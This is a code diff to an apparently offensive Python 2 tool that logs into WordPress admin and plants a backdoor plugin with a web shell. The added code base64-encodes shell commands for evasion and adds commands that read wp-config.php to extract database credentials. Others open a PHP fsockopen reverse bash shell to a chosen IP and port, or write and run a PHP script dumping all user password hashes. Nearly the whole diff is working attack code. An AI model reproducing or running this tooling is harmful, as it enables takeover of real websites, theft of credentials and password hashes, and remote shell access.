@@ -1,4 +1,6 @@
+import re
 import sys
+import base64
 import requests
 import argparse
 from random import choice
@@ -18,22 +20,12 @@ def uploadbackdoor(host,username,password,type,verbose):
                'redirect_to': host + '/wp-admin/',
                'testcookie': 1,
                }
-    windows = False
-    linux = False
     uploaddir = (''.join(choice(ascii_lowercase) for i in range(7)))
     session = requests.Session()
 
     r = session.post(url, headers=headers, data=payload)
     if verbose is True:
         print "Server Header: " + r.headers['Server']
-    if ("IIS" or "Microsoft") not in r.headers:
-        if verbose is True:
-            print "Probably a Linux server"
-        linux = True
-    else:
-        if verbose is True:
-            print "Probably a Windows server"
-        windows = True
     if r.status_code == 200:
         if verbose is True:
             print "Found Login Page"
@@ -70,39 +62,99 @@ def uploadbackdoor(host,username,password,type,verbose):
     return uploaddir
 
 
-def testlinux():
-
-    params = [('cmd', 'uname -a')]
-    print "Sending command: uname -a"
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    print sendcommand.text
-
-
-def testwindows():
-
-    params = [('cmd', 'ver')]
-    print "Sending command: ver"
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-    print sendcommand.text
-
-
 def commandloop(host,uploaddir):
     while True:
         cmd = raw_input('os-shell> ')
-        params = [('cmd', cmd)]
+        params = [('cmd', cmd.encode('base64'))]
         if (cmd == "quit") or (cmd == "exit"):
             sys.exit(2)
         if cmd == "help":
             print "Except for the commands 'help', 'exit', and 'quit' the command will be ran on the remote host"
+        if cmd == "dbcreds":
+            datacreds(host,uploaddir)
+        if cmd == "hashdump":
+            hashdump(host, uploaddir)
+        if cmd == "upgrade":
+            upgrade(host, uploaddir)
         else:
-            print "Sending command: " + cmd
-        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
-        print sendcommand.text
+            print "Sent command: " + cmd
+            sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+            print sendcommand.text
 
 def reverseshell(host, ip, port,uploaddir):
     params = [('ip', ip), ('port', port)]
     print "Sending reverse shell to " + ip + " port " + port
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/reverse.php", params=params)
+
+
+def datacreds(host,uploaddir):
+    params = [('cmd', 'cat ../../../wp-config.php'.encode('base64'))]
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    #print sendcommand.text
+
+    user =  credextract(sendcommand.text, 'DB_USER')
+    password = credextract(sendcommand.text, 'DB_PASSWORD')
+    host = credextract(sendcommand.text, 'DB_HOST')
+    db = credextract(sendcommand.text, 'DB_NAME')
+    #print "user: " + user
+    #print "password: " + password
+    #print "host: " + host
+    #print "database: " + db
+    return host, user, password, db
+
+
+def credextract(list, key):
+    s = list
+    start = s.find(key)
+    end = s.find(';', start)
+    s = s[start:end]
+    se = s.split("'")
+    return se[2]
+
+def upgrade(host,uploaddir):
+    ip = raw_input('IP Address: ')
+    port = raw_input('Port: ')
+    params = [('cmd', ('php -r \'$sock=fsockopen("' + ip + '",' + port + ');exec("/bin/bash -i <&3 >&3 2>&3");\'').encode('base64'))]
+    print "Sending reverse shell to " + ip + " port " + port
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+
+def hashdump(host,uploaddir):
+    items = datacreds(host, uploaddir)
+    dumpfile = '''<?php
+$servername = "%s";
+$username = "%s";
+$password = "%s";
+$dbname = "%s";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password, $dbname);
+// Check connection
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+$sql = "SELECT ID, user_login, user_pass FROM wp_users";
+$result = $conn->query($sql);
+
+if ($result->num_rows > 0) {
+    // output data of each row
+    while($row = $result->fetch_assoc()) {
+        echo "ID: " . $row["ID"]. "- Userame: " . $row["user_login"]. "  Password: " . $row["user_pass"]. "\n";
+    }
+} else {
+    echo "0 results";
+}
+$conn->close();
+?> ''' % (items[0], items[1], items[2], items[3])
+    payload = dumpfile.encode('base64')
+
+    params = [
+    ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > hashdump.php').encode('base64'))]
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    params = [
+    ('cmd', 'php hashdump.php'.encode('base64'))]
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    print sendcommand.text
 
 
 def printbanner():
